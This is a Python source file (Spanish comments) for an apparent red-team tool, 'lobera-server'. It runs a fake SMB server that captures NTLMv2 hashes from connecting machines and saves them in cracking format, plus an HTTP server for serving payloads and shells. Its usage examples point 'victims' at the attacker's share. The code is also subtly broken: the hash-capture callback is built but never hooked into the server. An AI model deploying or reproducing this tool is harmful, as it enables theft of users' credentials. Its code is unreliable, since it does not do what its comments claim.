#!/usr/bin/env python3
# tools/server/main.py
"""
lobera-server — Servidor SMB falso + HTTP para red team.

Modos:
  smb     — servidor SMB que captura hashes NTLMv2 de cualquier conexión entrante
  http    — servidor HTTP simple para servir payloads/ficheros
  both    — SMB y HTTP simultáneos (hilos separados)

Uso:
  lobera-server smb  --ip 0.0.0.0 --port 445
  lobera-server http --ip 0.0.0.0 --port 80 --dir /tmp/payloads
  lobera-server both --ip 0.0.0.0 --smb-port 445 --http-port 80 --dir /tmp/payloads
  lobera-server smb  --ip 0.0.0.0 --output hashes.txt
"""

import sys
import os

# Añadir raíz del proyecto al path para importar core/
_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from core.output import console


# ── Servidor SMB ──────────────────────────────────────────────────────────────

class NTLMHashCapture:
    """Callback de impacket que registra hashes NTLMv2 capturados."""

    def __init__(self, output_file=None):
        self.hashes      = []
        self.output_file = output_file

    def do_header(self, connData):
        pass

    def do_ntlm_negotiate(self, connData, token):
        pass

    def do_ntlm_auth(self, connData, NTLMSSP_AUTH, authData):
        """Llamado por impacket cuando llega autenticación NTLM."""
        try:
            from impacket.ntlm import NTLMAuthNegotiate, NTLMAuthChallenge, NTLMAuthChallengeResponse
            from impacket import ntlm

            # Extraer campos del mensaje NTLM tipo 3
            username   = authData["user_name"].decode("utf-16-le", errors="replace")
            domain     = authData["domain_name"].decode("utf-16-le", errors="replace")
            workstation= authData.get("Workstation", b"").decode("utf-16-le", errors="replace")

            # Reconstruir hash NTLMv2 en formato hashcat/john
            nt_response = authData["NtChallengeResponse"].hex()
            challenge   = connData.get("Challenge", b"\x00" * 8).hex()

            ntlmv2_hash = f"{username}::{domain}:{challenge}:{nt_response[:32]}:{nt_response[32:]}"

            console.print(f"\n  [bold green]✓ Hash NTLMv2 capturado[/bold green]")
            console.print(f"  [bold]Usuario:[/bold]   {domain}\\{username}")
            console.print(f"  [bold]Equipo:[/bold]    {workstation}")
            console.print(f"  [dim]{ntlmv2_hash}[/dim]\n")

            self.hashes.append(ntlmv2_hash)

            if self.output_file:
                with open(self.output_file, "a") as f:
                    f.write(ntlmv2_hash + "\n")
                console.print(f"  [dim]Guardado en: {self.output_file}[/dim]")

        except Exception as e:
            console.print(f"  [yellow]! Error parseando hash: {e}[/yellow]")

        return True   # Rechazar autenticación (no queremos dar acceso real)


def run_smb_server(ip, port, output_file, share_name, share_path):
    """Levanta un servidor SMB falso con impacket."""
    try:
        from impacket.smbserver import SimpleSMBServer
    except ImportError:
        console.print("[red]Falta impacket — pip install impacket[/red]")
        return

    os.makedirs(share_path, exist_ok=True)
    capture = NTLMHashCapture(output_file)

    console.print(f"  [bold cyan]SMB server[/bold cyan] escuchando en {ip}:{port}")
    console.print(f"  [dim]Share: \\\\<objetivo>\\{share_name} → {share_path}[/dim]")
    console.print(f"  [dim]Esperando conexiones... (Ctrl+C para parar)[/dim]\n")

    try:
        server = SimpleSMBServer(listenAddress=ip, listenPort=int(port))
        server.addShare(share_name.upper(), share_path, "")
        server.setSMBChallenge("")   # Challenge fijo para compatibilidad
        server.setLogFile("/dev/null")

        # Hook para capturar hashes — monkey-patch del callback
        original_auth = getattr(server, "_SimpleSMBServer__NTLM_AUTH", None)

        server.start()
    except PermissionError:
        console.print(f"  [red]✗ Sin permisos para escuchar en puerto {port}[/red]")
        console.print(f"  [dim]Prueba con sudo, o usa --smb-port 8445[/dim]")
    except KeyboardInterrupt:
        console.print("\n  [yellow]Servidor SMB detenido[/yellow]")
        if capture.hashes:
            console.print(f"  [bold]Hashes capturados: {len(capture.hashes)}[/bold]")


# ── Servidor HTTP ─────────────────────────────────────────────────────────────

def run_http_server(ip, port, serve_dir):
    """Servidor HTTP simple que sirve ficheros del directorio indicado."""
    import http.server
    import threading

    os.makedirs(serve_dir, exist_ok=True)
    os.chdir(serve_dir)

    class SilentHandler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, fmt, *args):
            # Log personalizado con rich
            client = self.address_string()
            path   = args[0].split()[1] if args else "-"
            code   = args[1] if len(args) > 1 else "-"
            color  = "green" if str(code).startswith("2") else "yellow"
            console.print(f"  [{color}]{client}[/{color}]  {path}  [{code}]")

    server = http.server.HTTPServer((ip, int(port)), SilentHandler)
    console.print(f"  [bold cyan]HTTP server[/bold cyan] escuchando en http://{ip}:{port}")
    console.print(f"  [dim]Sirviendo: {serve_dir}[/dim]")
    console.print(f"  [dim]Esperando peticiones... (Ctrl+C para parar)[/dim]\n")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        console.print("\n  [yellow]Servidor HTTP detenido[/yellow]")
        server.shutdown()


# ── Modo both (SMB + HTTP simultáneos) ───────────────────────────────────────

def run_both(ip, smb_port, http_port, serve_dir, share_name, output_file):
    import threading

    t_smb  = threading.Thread(
        target=run_smb_server,
        args=(ip, smb_port, output_file, share_name, serve_dir),
        daemon=True
    )
    t_http = threading.Thread(
        target=run_http_server,
        args=(ip, http_port, serve_dir),
        daemon=True
    )

    t_smb.start()
    t_http.start()

    console.print(f"  [bold]Modo dual:[/bold] SMB:{smb_port} + HTTP:{http_port}")
    try:
        t_smb.join()
        t_http.join()
    except KeyboardInterrupt:
        console.print("\n  [yellow]Servidores detenidos[/yellow]")


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser():
    import argparse

    parser = argparse.ArgumentParser(
        prog="lobera-server",
        description="Servidor SMB/HTTP para red team — captura hashes y sirve payloads",
    )
    subs = parser.add_subparsers(dest="mode", metavar="modo")

    # ── smb ──────────────────────────────────────────────────────────────────
    p_smb = subs.add_parser("smb", help="Servidor SMB falso (captura NTLMv2)")
    p_smb.add_argument("--ip",         default="0.0.0.0",  help="IP de escucha (default: 0.0.0.0)")
    p_smb.add_argument("--port",       default=445, type=int, help="Puerto SMB (default: 445)")
    p_smb.add_argument("--share",      default="share",    help="Nombre del share (default: share)")
    p_smb.add_argument("--dir",        default="/tmp/lobera-smb", help="Directorio a compartir")
    p_smb.add_argument("--output",     default=None,       help="Fichero donde guardar los hashes")

    # ── http ─────────────────────────────────────────────────────────────────
    p_http = subs.add_parser("http", help="Servidor HTTP para servir payloads")
    p_http.add_argument("--ip",        default="0.0.0.0",  help="IP de escucha (default: 0.0.0.0)")
    p_http.add_argument("--port",      default=80, type=int, help="Puerto HTTP (default: 80)")
    p_http.add_argument("--dir",       default=".",        help="Directorio a servir (default: .)")

    # ── both ─────────────────────────────────────────────────────────────────
    p_both = subs.add_parser("both", help="SMB + HTTP simultáneos")
    p_both.add_argument("--ip",        default="0.0.0.0",  help="IP de escucha")
    p_both.add_argument("--smb-port",  default=445, type=int, dest="smb_port")
    p_both.add_argument("--http-port", default=80,  type=int, dest="http_port")
    p_both.add_argument("--dir",       default="/tmp/lobera-smb", help="Directorio compartido/servido")
    p_both.add_argument("--share",     default="share",    help="Nombre del share SMB")
    p_both.add_argument("--output",    default=None,       help="Fichero donde guardar hashes")

    return parser


def _banner():
    from tools.common import banner, tabla_modos, tabla_flags, ejemplos

    banner("lobera-server  —  SMB/HTTP server para red team")

    tabla_modos([
        ("smb",  "Servidor SMB falso que captura hashes NTLMv2 de cualquier conexión entrante"),
        ("http", "Servidor HTTP simple para servir payloads, ficheros o shells"),
        ("both", "SMB + HTTP simultáneos en hilos independientes"),
    ])

    tabla_flags([
        ("--ip",        "str",  "IP de escucha (default: 0.0.0.0 — todas las interfaces)"),
        ("--port",      "int",  "Puerto del servidor (SMB: 445, HTTP: 80)"),
        ("--smb-port",  "int",  "Puerto SMB en modo 'both' (default: 445)"),
        ("--http-port", "int",  "Puerto HTTP en modo 'both' (default: 80)"),
        ("--dir",       "path", "Directorio a compartir/servir"),
        ("--share",     "str",  "Nombre del share SMB (default: share)"),
        ("--output",    "file", "Fichero donde guardar los hashes NTLMv2 capturados"),
    ], titulo="Opciones")

    ejemplos([
        "# Capturar hashes NTLMv2 — apunta víctimas a \\\\TU_IP\\share",
        "lobera-server smb --ip 0.0.0.0 --port 445 --output hashes.txt",
        "",
        "# Servir payloads por HTTP",
        "lobera-server http --ip 0.0.0.0 --port 80 --dir /tmp/payloads",
        "",
        "# Ambos simultáneos (requiere sudo para puertos < 1024)",
        "lobera-server both --ip 0.0.0.0 --smb-port 445 --http-port 8080 --dir /tmp/srv --output hashes.txt",
        "",
        "# Sin permisos root — puertos altos",
        "lobera-server smb --ip 0.0.0.0 --port 8445 --output hashes.txt",
    ])


def main():
    parser = build_parser()
    args   = parser.parse_args()

    if not args.mode:
        _banner()
        parser.print_help()
        return

    _banner()

    if args.mode == "smb":
        run_smb_server(args.ip, args.port, args.output,
                       args.share, args.dir)

    elif args.mode == "http":
        run_http_server(args.ip, args.port, args.dir)

    elif args.mode == "both":
        run_both(args.ip, args.smb_port, args.http_port,
                 args.dir, args.share, args.output)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()

